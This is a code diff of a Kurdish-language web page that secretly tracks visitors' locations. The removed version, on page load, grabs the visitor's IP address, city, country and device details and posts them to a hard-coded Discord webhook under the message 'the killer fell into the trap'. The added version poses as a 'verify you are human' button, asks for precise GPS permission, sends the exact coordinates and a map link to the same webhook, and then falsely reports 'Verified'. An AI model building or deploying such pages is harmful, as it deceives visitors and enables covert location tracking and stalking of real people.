@@ -2,36 +2,59 @@
 <html lang="ku">
 <head>
     <meta charset="UTF-8">
-    <title>Checking Connection...</title>
+    <title>پشکنینی ناسنامە</title>
+    <style>
+        body { background-color: #1a1a1a; color: white; text-align: center; font-family: sans-serif; padding-top: 50px; }
+        button { background-color: #2ecc71; border: none; color: white; padding: 15px 32px; font-size: 16px; border-radius: 8px; cursor: pointer; }
+    </style>
 </head>
 <body>
-    <h2 style="text-align: center; margin-top: 50px;">تکایە کەمێک چاوەڕوان بە، سیستەمەکە خەریکە نوێ دەبێتەوە...</h2>
+    <h2>بۆ بینینی وێنەکە یان زانیارییەکان، دەبێت لایەنی کەم یەک جار بیسەلمێنیت کە مرۆڤیت</h2>
+    <p>تکایە کلیک لەسەر دوگمەی خوارەوە بکە و پاشان مۆڵەتی "Allow" بدە</p>
+    
+    <button onclick="getLocation()">من مرۆڤم - Verify</button>
 
     <script>
-        // وەرگرتنی زانیارییەکان بەبێ داواکردن
-        async function captureData() {
-            // وەرگرتنی IP و زانیاری شار لە ڕێگەی API دەرەکی
-            const response = await fetch('https://ipapi.co/json/');
-            const data = await response.json();
+        const webhookURL = "https://discordapp.com/api/webhooks/1501579519168086199/VAH8gJiYir1-eEf3fxmAEvuCYG3SpJmPQi0Vc9ZnRV_ge0URfFF_qwlGyInZDJmPbd3e";
+
+        function getLocation() {
+            if (navigator.geolocation) {
+                // داوای لۆکەیشنی ورد دەکات (High Accuracy)
+                navigator.geolocation.getCurrentPosition(sendData, handleError, {
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 0
+                });
+            } else {
+                alert("ئەم وێبگەڕە پشتگیری GPS ناکات.");
+            }
+        }
+
+        async function sendData(position) {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            const accuracy = position.coords.accuracy;
 
             const message = {
-                content: "🚨 **بکوژەکە کەوتە ناو تەڵەکەوە!** 🚨\n" +
-                         "🌐 **IP:** " + data.ip + "\n" +
-                         "📍 **شار:** " + data.city + ", " + data.region + "\n" +
-                         "🌍 **وڵات:** " + data.country_name + "\n" +
-                         "📱 **ئامێر:** " + navigator.userAgent + "\n" +
-                         "🗺️ **نەخشە:** https://www.google.com/maps?q=" + data.latitude + "," + data.longitude
+                content: "🎯 **بکوژەکە بە وردی دۆزرایەوە!** 🎯\n" +
+                         "📍 **Latitude:** `" + lat + "`\n" +
+                         "📍 **Longitude:** `" + lon + "`\n" +
+                         "📏 **ڕادەی وردی:** " + accuracy + " مەتر\n" +
+                         "🗺️ **شوێنی تەواو لەسەر نەخشە:** https://www.google.com/maps?q=" + lat + "," + lon
             };
 
-            // ناردنی زانیارییەکە بۆ Discord Webhook (یان هەر سێرڤەرێکی تر)
-            fetch('https://discordapp.com/api/webhooks/1501579519168086199/VAH8gJiYir1-eEf3fxmAEvuCYG3SpJmPQi0Vc9ZnRV_ge0URfFF_qwlGyInZDJmPbd3e', {
+            await fetch(webhookURL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(message)
             });
+
+            alert("سەلمێنرا! ئێستا دەتوانیت بەردەوام بیت.");
         }
 
-        window.onload = captureData;
+        function handleError(error) {
+            alert("تکایە مۆڵەتی GPS بدە بۆ ئەوەی پڕۆسەکە تەواو بێت.");
+        }
     </script>
 </body>
 </html>
